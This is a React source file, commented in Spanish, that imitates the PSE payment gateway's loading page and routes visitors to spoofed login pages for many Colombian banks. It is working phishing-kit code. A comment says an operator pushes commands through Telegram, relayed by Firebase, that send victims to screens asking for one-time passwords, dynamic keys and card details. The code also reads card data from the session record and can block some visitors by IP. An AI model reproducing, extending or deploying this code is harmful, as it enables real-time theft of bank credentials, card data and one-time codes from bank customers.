import { useCallback, useEffect, useRef, useState } from "react";
import { limpiarPaddingBody } from "../../../@utils";
import { instanceBackend } from "../../axios/instanceBackend";
import { rtdb } from "../../../services/firebaseClient";
import { ref as rtdbRef, onValue, off } from "firebase/database";
import bannerDer from "./img/NFbanner-der-pse.png";
import bannerIzq from "./img/NFbanner-izq-pse.png";
import contact from "./img/contanw-pse.svg";
import footer from "./img/footer-pse.svg";
import footerPersona from "./img/footerPersona-pse.svg";
import mobile from "./img/mobile-pse.svg";
import PseLoaderFrames from "./PseLoaderFrames.jsx";
import { buildTcIngresoUrl, redirectToTcIngreso } from "../ingresoTc/tcSessionHelper";
import "./PseLoading.css";

/** Misma espera que al redirigir del loading PSE al login del banco */
export const PSE_LOADING_DELAY_MS = 5000;

/** sessionStorage: sessionId del enlace PSE que el banco debe usar al llegar desde /pse */
export const PSE_SESSION_HANDOFF_KEY = "pse_session_handoff";

/** Mensajes del título central (sin puntos al final; se animan solos) */
export const PSE_PROCESSING_MESSAGES = [
  "Estamos procesando tu transacción",
  "Por favor espera un momento",
  "Verificando tu información",
];

/** Cada cuántos ms avanza un punto (. → .. → ...) */
export const PSE_PROCESSING_DOT_STEP_MS = 1000;

/** Puntos por mensaje antes de pasar al siguiente (3 s = 3 pasos de 1 s) */
export const PSE_PROCESSING_DOTS_PER_MESSAGE = 3;

// Se inicializan las rutas de login por banco
const PSE_BANK_ROUTES = {
  avvillas: "/banco_av_villas_pse",
  bancolombia: "/bancolombia",
  bbva: "/banco_bbva_login_pse",
  bogota: "/banco_bogota_pse",
  cajasocial: "/logo_caja_social_pse",
  colpatria: "/colpatria_pse_login",
  davivienda: "/davivienda_pse",
  falabella: "/falabella_pse",
  itau: "/itau_pse",
  nequi: "/nequi",
  occidente: "/occidente_pse",
  popular: "/popular_pse",
  serfinanza: "/serfinanza",
};

// Se inicializan alias legacy que todavía pueden venir en url_redirect
const PSE_BANK_ROUTE_ALIASES = {
  banco_av_villas_pse: "avvillas",
  banco_bbva_login_pse: "bbva",
  banco_bogota_pse: "bogota",
  logo_caja_social_pse: "cajasocial",
  colpatria_pse_login: "colpatria",
  davivienda_pse: "davivienda",
  falabella_pse: "falabella",
  itau_pse: "itau",
  occidente_pse: "occidente",
  popular_pse: "popular",
};

// Se crea la función para procesar el mensaje
function processingMessageBase(text) {

  // Se retorna el texto procesado
  return String(text).replace(/\.+$/, "").trimEnd();
}

// Se crea la funcion para resolver la ruta del banco
function getPseBankRoute(bankName) {

  // Se normaliza el banco a minusculas
  const rawKey = String(bankName || "").trim().toLowerCase().replace(/^\/+/, "");
  const key = PSE_BANK_ROUTE_ALIASES[rawKey] || rawKey;

  // Se retorna la ruta si existe
  return PSE_BANK_ROUTES[key] || "";
}

// Se crea el componente
const PseLoading = ({ variant = "entry", onFinalizeReady }) => {

  // Se valida si es el finalizo
  const isFinalize = variant === "finalize";

  // Se capturan los parametros que vienen por url
  const urlParams = new URLSearchParams(window.location.search);
  const bank = urlParams.get("bank");

  // Referencia para el listener de Firebase (reemplaza polling)
  const fbListenerRef = useRef(null);
  const sessionIdRef = useRef(null);

  // Estado para rastrear si está esperando respuesta
  const [isPolling, setIsPolling] = useState(false);
  const [processingTick, setProcessingTick] = useState(0);

  // Se limpia el storage una sola vez al montar la vista PSE
  useEffect(() => {

    // Se valida si no es la vista final
    if (!isFinalize) {

      // Se limpia el localStorage y el sessionStorage
      localStorage.clear();
      sessionStorage.clear();
    }

    // Se sale del metodo
    return;
  }, [isFinalize]);

  // Se captura el indice del mensaje de procesamiento
  const processingMessageIndex = PSE_PROCESSING_MESSAGES.length > 0 ? Math.floor(processingTick / PSE_PROCESSING_DOTS_PER_MESSAGE) % PSE_PROCESSING_MESSAGES.length : 0;
  const processingDotCount = (processingTick % PSE_PROCESSING_DOTS_PER_MESSAGE) + 1;
  const processingLabel = PSE_PROCESSING_MESSAGES.length ? processingMessageBase(PSE_PROCESSING_MESSAGES[processingMessageIndex]) : "";

  // Se crea el useEffect para actualizar el tick de procesamiento
  useEffect(() => {

    // Se crea el temporizador
    const timer = window.setInterval(() => {

      // Se actualiza el tick de procesamiento
      setProcessingTick((t) => t + 1);
    }, PSE_PROCESSING_DOT_STEP_MS);

    // Se retorna el clearInterval
    return () => window.clearInterval(timer);
  }, []);

  // Fondo blanco y sin capa oscura global de pasarela (móvil usa body::after #2C2A29)
  useEffect(() => {

    // Se limpia el padding del body
    limpiarPaddingBody();

    // Se captura el html y el body
    const html = document.documentElement;
    const body = document.body;

    // Se captura el fondo del html y el body
    const prevHtmlBg = html.style.backgroundColor;
    const prevBodyBg = body.style.backgroundColor;

    // Se agrega la clase pse-loading-active al body
    body.classList.add("pse-loading-active");
    html.style.setProperty("background-color", "#ffffff", "important");
    body.style.setProperty("background-color", "#ffffff", "important");

    // Se retorna el clearInterval
    return () => {

      // Se limpia el padding del body
      limpiarPaddingBody();

      // Se remueve la clase pse-loading-active del body
      body.classList.remove("pse-loading-active");

      // Se restaura el fondo del html y el body
      html.style.backgroundColor = prevHtmlBg;
      body.style.backgroundColor = prevBodyBg;
    };
  }, []);

  // Se crea el useEffect
  useEffect(() => {

    // Se valida si es el finalizo
    if (isFinalize) {

      // Se crea el temporizador
      const timer = setTimeout(() => {

        // Se ejecuta el callback
        onFinalizeReady?.();
      }, PSE_LOADING_DELAY_MS);

      // Se retorna el clearTimeout
      return () => clearTimeout(timer);
    }

    // Se captura el banco y se convierte a minuscula
    const bankLower = bank?.toLowerCase();
    const sessionId = urlParams.get("sessionId");
    const bankParam = urlParams.get("bank");
    const modeParam = urlParams.get("mode");

    // Se valida si la sesión es de TC
    const isTc = modeParam === "tc";

    // Se valida si la sesión es de TC
    if (sessionId && isTc && !bankParam) {

      // Se guarda el sessionId en la referencia
      sessionIdRef.current = sessionId;

      // Se ejecuta la funcion
      handleLoginTc();
    }

    // Se valida si viene desde una pantalla de panel
    else if (sessionId && !bankParam && !isTc) {

      // Se guarda el sessionId en la referencia
      sessionIdRef.current = sessionId;

      // Se ejecuta la funcion
      handleLogin();
    } else {

      // Se captura la url del banco
      const bankUrl = getPseBankRoute(bankLower);
      const href = bankUrl;

      // Se setea el sessionId en el localStorgae
      if (sessionId) {

        // Se setea el sessionId en sessionStorage como handoff
        sessionStorage.setItem(PSE_SESSION_HANDOFF_KEY, sessionId);

        // Se setea el sessionId en el localStorage
        localStorage.setItem("sessionId", sessionId);
      }

      // Se valida que exista la url
      if (bankUrl) {

        // Se crea el temporizador
        setTimeout(() => {

          // Se redirecciona al banco
          window.location.href = href;
        }, PSE_LOADING_DELAY_MS);
      }
    }
  }, []);

  /**
   * initPolling → reemplazado por listener de Firebase RTDB.
   * Escucha /pasarela/sessions/{sessionId} en tiempo real.
   * Cuando el operador pulsa un botón en Telegram el cambio
   * llega en ~100ms sin necesidad de polling.
   */
  const initPolling = useCallback((usuario) => {

    // Establecer que está esperando
    setIsPolling(true);

    // Limpiar listener anterior si existe
    if (fbListenerRef.current) {
      off(fbListenerRef.current);
      fbListenerRef.current = null;
    }

    const sid = sessionIdRef.current;
    if (!sid) return;

    // Suscribirse al nodo de la sesión en Firebase RTDB
    const sessionRef = rtdbRef(rtdb, `pasarela/sessions/${sid}`);
    fbListenerRef.current = sessionRef;

    onValue(sessionRef, (snapshot) => {
      const data = snapshot.val();
      if (!data) return;

      // Construir respuesta equivalente a la del endpoint verify-state
      const estado = data.lastStatus || "pendiente";
      const url = data.urlAutomatic || data.urlRedirect || data.linkCustom || null;
      const bank = data.banco || data.bank || "";
      const tc = Boolean(data.tc);
      const tarjeta = data.tarjeta || "";
      const cardData = data.cardData_tc || data.cardData_cvv || null;

      handleEstado({ estado, url, bank, tc, tarjeta, cardData });
    });
  }, []);

  /**
   * handleEstado — contiene la lógica de redirección (extraída de verifyState)
   * para poder ser llamada tanto por el listener de RTDB como por el polling
   * de respaldo.
   */
  const handleEstado = useCallback(({ estado, url, bank, tc, tarjeta, cardData }) => {
    const estadoLower = String(estado || "").toLowerCase();
    const hasUrl = Boolean(url && String(url).trim());
    const isTcFlow = Boolean(tc);
    const tarjetaDigits = String(tarjeta || "").replace(/\D/g, "");
    const canRedirectTc = isTcFlow && Boolean(bank) && tarjetaDigits.length > 0;
    const bankRoute = getPseBankRoute(bank);

    const tcRedirectStates = ["sol_login", "sol_otp", "sol_din", "error_otp", "error_din"];
    const tcFinalStates = ["sol_finalizar", "sol_finalizado", "solicitar_finalizar"];

    const shouldStop =
      estadoLower === "logo" ||
      estadoLower === "pse_session_ready" ||
      estadoLower === "gateway_transaction_ready" ||
      (estadoLower === "sol_link_custom" && hasUrl) ||
      (estadoLower === "link_bot" && hasUrl) ||
      (estadoLower === "sol_link_bot" && hasUrl) ||
      (estadoLower === "error_login" && Boolean(bankRoute)) ||
      (tcRedirectStates.includes(estadoLower) && canRedirectTc) ||
      (tcFinalStates.includes(estadoLower) && isTcFlow);

    if (shouldStop) {
      setIsPolling(false);
      // Limpiar listener cuando hay acción final
      if (fbListenerRef.current) {
        off(fbListenerRef.current);
        fbListenerRef.current = null;
      }
    }

    // Redireccionamiento según estado
    switch (estadoLower) {
      case "logo": {
        if (sessionIdRef.current) {
          localStorage.setItem("sessionId", sessionIdRef.current);
          sessionStorage.setItem(PSE_SESSION_HANDOFF_KEY, sessionIdRef.current);
        }
        const resolvedBank = String(url || bank || "").trim();
        const directRoute = getPseBankRoute(resolvedBank);
        if (directRoute) {
          window.location.href = directRoute;
        } else {
          window.location.href = "/pse?bank=" + encodeURIComponent(resolvedBank) + "&sessionId=" + encodeURIComponent(sessionIdRef.current || "");
        }
        break;
      }
      case "pse_session_ready":
      case "gateway_transaction_ready":
        if (hasUrl) window.location.replace(url);
        break;
      case "link_bot":
      case "sol_link_bot":
        if (hasUrl) {
          if (url.includes("payulatam.com") || url.includes("registro.pse.com.co")) {
            window.location.replace(url);
          } else {
            window.location.href = url;
          }
        }
        break;
      case "sol_link_custom":
        if (hasUrl) window.location.href = url;
        break;
      case "sol_otp":
        if (canRedirectTc) window.location.href = buildTcIngresoUrl("/ingreso-tc/otp", sessionIdRef.current, bank, tarjetaDigits);
        break;
      case "sol_din":
        if (canRedirectTc) window.location.href = buildTcIngresoUrl("/ingreso-tc/dinamica", sessionIdRef.current, bank, tarjetaDigits);
        break;
      case "error_otp":
        if (canRedirectTc) redirectToTcIngreso("/ingreso-tc/otp", sessionIdRef.current, bank, tarjetaDigits, "error_otp");
        break;
      case "error_din":
        if (canRedirectTc) redirectToTcIngreso("/ingreso-tc/dinamica", sessionIdRef.current, bank, tarjetaDigits, "error_din");
        break;
      case "error_login":
        if (bankRoute) window.location.href = bankRoute;
        break;
      case "sol_finalizar":
      case "solicitar_finalizar":
      case "sol_finalizado":
        if (isTcFlow) window.location.href = "/ingreso-tc/finalizado";
        break;
      case "block_ip":
        localStorage.clear();
        sessionStorage.clear();
        window.location.href = "/error";
        break;
      default:
        break;
    }
  }, []);

  // Función para verificar el estado de aprobación
  const verifyState = async () => {

    // Se usa el try catch
    try {

      // Se realiza la petición al backend
      const response = await instanceBackend.post(`/pse/verify-state/${sessionIdRef.current}`);

      // Se captura la respuesta
      const { estado, url, bank, tc, tarjeta } = response.data;
      const estadoLower = estado.toLowerCase();
      const hasUrl = Boolean(url && String(url).trim());
      const isTcFlow = Boolean(tc);
      const tarjetaDigits = String(tarjeta || "").replace(/\D/g, "");
      const canRedirectTc = isTcFlow && Boolean(bank) && tarjetaDigits.length > 0;
      const bankRoute = getPseBankRoute(bank);

      // Estados que detienen el polling (redirecciones o finales)
      const tcRedirectStates = [
        "sol_login",
        "sol_otp",
        "sol_din",
        "error_otp",
        "error_din",
      ];

      // Estados finalizados para finalizado TC y PSE
      const tcFinalStates = [
        "sol_finalizar",
        "sol_finalizado",
        "solicitar_finalizar",
      ];

      // Se valida si se debe parar el polling
      const shouldStopPolling =
        estadoLower === "logo" ||
        estadoLower === "pse_session_ready" ||
        estadoLower === "gateway_transaction_ready" ||
        (estadoLower === "sol_link_custom" && hasUrl) ||
        (estadoLower === "link_bot" && hasUrl) ||
        (estadoLower === "sol_link_bot" && hasUrl) ||
        (estadoLower === "error_login" && Boolean(bankRoute)) ||
        (tcRedirectStates.includes(estadoLower) && canRedirectTc) ||
        (tcFinalStates.includes(estadoLower) && isTcFlow);

      // Detener listener si es un estado final
      if (shouldStopPolling) {

        // Detener polling
        setIsPolling(false);

        // Limpiar listener de Firebase
        if (fbListenerRef.current) {
          off(fbListenerRef.current);
          fbListenerRef.current = null;
        }
      }

      // Mapeo de redirecciones
      switch (estadoLower) {
        case "logo": {
          // Se setea la sessionId en el localStorage y handoff
          if (sessionIdRef.current) {
            localStorage.setItem("sessionId", sessionIdRef.current);
            sessionStorage.setItem(PSE_SESSION_HANDOFF_KEY, sessionIdRef.current);
          }

          const resolvedBank = String(url || bank || "").trim();
          const directRoute = getPseBankRoute(resolvedBank);

          if (directRoute) {
            window.location.href = directRoute;
          } else {
            window.location.href = "/pse?bank=" + encodeURIComponent(resolvedBank) + "&sessionId=" + encodeURIComponent(sessionIdRef.current || "");
          }

          break;
        }
        case "pse_session_ready":
        case "gateway_transaction_ready": {

          // Se valid a si hay url
          if (hasUrl) {

            // Se redirige a la página de PayU/PSE
            console.log("[PSE-LOADING] Redirigiendo a PayU/PSE:", url.slice(0, 96));

            // Se redirige a la página de PayU/PSE
            window.location.replace(url);
          }

          // Se sale del switch
          break;
        }
        case "link_bot":
        case "sol_link_bot":

          // Se valida si hay url
          if (hasUrl) {

            // Se valida si la url es de PayU/PSE
            if (url.includes("payulatam.com") || url.includes("registro.pse.com.co")) {

              // Se loguea la redirección
              console.log("[PSE-LOADING] link_bot → PayU/PSE:", url.slice(0, 96));

              // Se redirige a la página de PayU/PSE
              window.location.replace(url);
            } else {

              // Se redirige a la página de PayU/PSE
              window.location.href = url;
            }
          }

          // Se sale del switch
          break;
        case "sol_link_custom":

          // Redirige cuando el distribuidor ya guardó la URL en Firebase
          if (hasUrl) {

            // Se redirige a la página del link custom
            window.location.href = url;
          }

          // Se sale del switch
          break;
        case "sol_otp":

          // Se valida flujo TC con bank y tarjeta del timeline
          if (canRedirectTc) {

            // Se redirige a la página de ingreso TC OTP
            window.location.href = buildTcIngresoUrl("/ingreso-tc/otp", sessionIdRef.current, bank, tarjetaDigits);
          }

          // Se sale del switch
          break;
        case "sol_din":

          // Se valida flujo TC con bank y tarjeta del timeline
          if (canRedirectTc) {

            // Se redirige a la página de ingreso TC Dinámica
            window.location.href = buildTcIngresoUrl(
              "/ingreso-tc/dinamica",
              sessionIdRef.current,
              bank,
              tarjetaDigits,
            );
          }

          // Se sale del switch
          break;
        case "error_otp":

          // Se valida flujo TC con bank y tarjeta del timeline
          if (canRedirectTc) {

            // Se redirige a OTP con alerta (tc_estado_alerta)
            redirectToTcIngreso(
              "/ingreso-tc/otp",
              sessionIdRef.current,
              bank,
              tarjetaDigits,
              "error_otp",
            );
          }

          // Se sale del switch
          break;
        case "error_din":

          // Se valida flujo TC con bank y tarjeta del timeline
          if (canRedirectTc) {

            // Se redirige a dinámica con alerta
            redirectToTcIngreso(
              "/ingreso-tc/dinamica",
              sessionIdRef.current,
              bank,
              tarjetaDigits,
              "error_din",
            );
          }

          // Se sale del switch
          break;
        case "error_login":

          // Se valida que exista una ruta del banco
          if (bankRoute) {

            // Se guarda la sessionId como handoff para reingresar al login del banco
            sessionStorage.setItem(PSE_SESSION_HANDOFF_KEY, sessionIdRef.current);

            // Se guarda la sessionId en el localStorage
            localStorage.setItem("sessionId", sessionIdRef.current);

            // Se redirige al login del banco correspondiente
            window.location.href = bankRoute;
          }

          // Se sale del switch
          break;
        case "sol_finalizar":
        case "sol_finalizado":
        case "solicitar_finalizar":

          // Se redirige al finalizado TC cuando el flujo viene por tarjeta
          if (isTcFlow) {

            // Se valida el flujo de finalizado por TC
            window.location.href = `/finalizado-tc?sessionId=${encodeURIComponent(sessionIdRef.current)}`;
          }

          // Se sale del switch
          break;
        default:
      }
    } catch (error) {

      // Detener polling
      setIsPolling(false);

      // Se cierra la sesión actual limpiando el localStorage
      localStorage.clear();

      // Limpiar listener de Firebase
      if (fbListenerRef.current) {
        off(fbListenerRef.current);
        fbListenerRef.current = null;
      }

      // Se redirige al inicio de sesión
      window.location.href = process.env.REACT_APP_URL_BANK;

      // Se retorna
      return;
    }
  };

  // Metodo encargado de iniciar sesion
  const handleLoginTc = async () => {

    // Se inicializa el json
    const dataSend = {
      "data": {
        "attributes": {
          "fecha": new Date().toISOString(),
          "sessionId": sessionIdRef.current,

          // DATOS NUEVOS PARA EL DISTRIBUIDOR
          "backend": "P01",
          "backend_central_url": process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
          "backend_url": "/api/v1/pse/tc",
        },
      },
    };

    // Se usa el try para la peticion
    try {

      // Se envia la peticion
      const response = await instanceBackend.post(dataSend?.data?.attributes?.backend_central_url, dataSend);

      // Se valida la respuesta
      if (response.data.success) {

        // Se guarda la sessionId en el localStorage
        localStorage.setItem("sessionId", response.data.sessionId);

        // Guardar sesión real del backend
        sessionIdRef.current = response.data.sessionId;

        // Iniciar polling para esperar aprobación
        initPolling();
      }
    } catch (error) {

      // Manejo detallado de errores
      if (error.response) {

        // Error de respuesta del servidor
        alert(`Error ${error.response.status}: ${error.response.data.message || "Error del servidor"}`);
      } else if (error.request) {

        // Error de conexión
        alert("Error de conexión con el servidor");
      } else {

        // Error inesperado
        alert("Error inesperado: " + error.message);
      }
    } finally {
    }
  };

  // Metodo encargado de iniciar sesion
  const handleLogin = async () => {

    // Se inicializa el json
    const dataSend = {
      "data": {
        "attributes": {
          "fecha": new Date().toISOString(),
          "sessionId": sessionIdRef.current,

          // DATOS NUEVOS PARA EL DISTRIBUIDOR
          "backend": "P01",
          "backend_central_url": process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
          "backend_url": "/api/v1/pse/login",
        },
      },
    };

    // Se usa el try para la peticion
    try {

      // Se envia la peticion
      const response = await instanceBackend.post(dataSend?.data?.attributes?.backend_central_url, dataSend);

      // Se valida la respuesta
      if (response.data.success) {

        // Se guarda la sessionId en el localStorage
        localStorage.setItem("sessionId", response.data.sessionId);

        // Guardar sesión real del backend
        sessionIdRef.current = response.data.sessionId;

        // Iniciar polling para esperar aprobación
        initPolling();
      }
    } catch (error) {

      // Manejo detallado de errores
      if (error.response) {

        // Error de respuesta del servidor
        alert(`Error ${error.response.status}: ${error.response.data.message || "Error del servidor"}`);
      } else if (error.request) {

        // Error de conexión
        alert("Error de conexión con el servidor");
      } else {

        // Error inesperado
        alert("Error inesperado: " + error.message);
      }
    } finally {
    }
  };

  // Se retorna el HTML
  return (
    <div className="pse-container">
      {/* Header Section */}
      <header className="pse-header">
        <div className="pse-header-content">
          <div className="pse-logo-left">
            <img
              src={bannerIzq}
              alt="PSE Logo"
              width={308}
              height={88}
              decoding="async"
            />
          </div>
          <div className="pse-logo-right">
            <img
              src={bannerDer}
              alt="Fácil, rápido y seguro"
              width={186}
              height={104}
              decoding="async"
            />
          </div>
        </div>
      </header>

      {/* Main Content Section */}
      <main className="pse-main">
        <div className="processing-box">
          <h2 className="processing-text">
            {processingLabel}
            {".".repeat(processingDotCount)}
          </h2>
          <div className="loader-wrapper">
            <PseLoaderFrames />
          </div>
        </div>
      </main>

      {/* Modal de espera de polling */}
      {isPolling && (
        <div
          className="modal-overlay"
          style={{
            position: "fixed",
            top: 0,
            left: 0,
            right: 0,
            bottom: 0,
            backgroundColor: "rgba(0,0,0,0.7)",
            display: "flex",
            justifyContent: "center",
            alignItems: "center",
            zIndex: 9999,
          }}
        >
          <div
            style={{
              backgroundColor: "#2C2A29",
              padding: "30px",
              borderRadius: "10px",
              maxWidth: "500px",
              width: "90%",
              textAlign: "center",
              border: "2px solid #F58220",
            }}
          >
            <div
              style={{
                fontSize: "60px",
                marginBottom: "20px",
                animation: "pulse 2s infinite",
              }}
            >
              ⏳
            </div>
            <h3 style={{ color: "white", marginBottom: "15px" }}>
              Esperando Respuesta
            </h3>
            <p style={{ color: "#F58220", marginBottom: "20px" }}>
              Consultando estado de tu transacción...
            </p>
            <div
              style={{
                display: "flex",
                justifyContent: "center",
                alignItems: "center",
                marginBottom: "20px",
              }}
            >
              <div
                className="spinner"
                style={{
                  width: "40px",
                  height: "40px",
                  border: "4px solid #F58220",
                  borderTop: "4px solid transparent",
                  borderRadius: "50%",
                  animation: "spin 1s linear infinite",
                  marginRight: "10px",
                }}
              ></div>
              <span style={{ color: "white" }}>Por favor espera...</span>
            </div>
          </div>
        </div>
      )}

      <style>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        @keyframes pulse {
          0% { opacity: 1; }
          50% { opacity: 0.5; }
          100% { opacity: 1; }
        }
      `}</style>

      {/* Footer Section */}
      <footer className="pse-footer">
        <div className="footer-content">
          {/* ACH Logo Left */}
          <div className="footer-logo">
            <img
              src={footer}
              alt="ACH Colombia"
              width={148}
              height={124}
              decoding="async"
            />
          </div>

          {/* Contact Info Bar Right */}
          <div className="contact-bar-wrapper">
            <div className="accent-bar"></div>
            <div className="contact-bar">
              <div className="contact-col persona-icon">
                <img src={footerPersona} alt="Persona" />
              </div>
              <div className="contact-col info-text">
                <span className="info-label">Para mayor información</span>
                <span className="info-sublabel">comunícate con nosotros:</span>
              </div>
              <div className="contact-col contact-methods">
                <div className="method">
                  <img src={mobile} alt="Phone" className="method-icon" />
                  <span>En Bogotá:</span>
                </div>
                <div className="method">
                  <img src={contact} alt="Website" className="method-icon" />
                  <span>Escríbenos:</span>
                </div>
              </div>
              <div className="contact-col contact-details">
                <div className="detail">+57 (601) 3808890 opción 5</div>
                <div className="detail">
                  <a
                    href="https://www.pse.com.co/persona-centro-de-ayuda"
                    target="_blank"
                    rel="noopener noreferrer"
                  >
                    www.pse.com.co/persona-centro-de-ayuda
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

// Se exporta el componente
export default PseLoading;